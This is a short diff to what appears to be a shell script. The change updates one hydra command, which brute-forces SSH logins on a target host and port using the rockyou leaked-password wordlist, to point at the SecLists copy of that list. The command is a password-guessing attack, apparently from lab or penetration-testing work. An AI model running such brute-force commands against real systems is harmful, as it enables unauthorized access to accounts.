@@ -17,4 +17,4 @@ echo "USERNAME: $UNAME"
 
 
 
-hydra -V -l $UNAME -P "/usr/share/wordlists/rockyou.txt" $TARGET ssh -t 4 -s $PORT 
+hydra -V -l $UNAME -P "/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt" $TARGET ssh -t 4 -s $PORT 
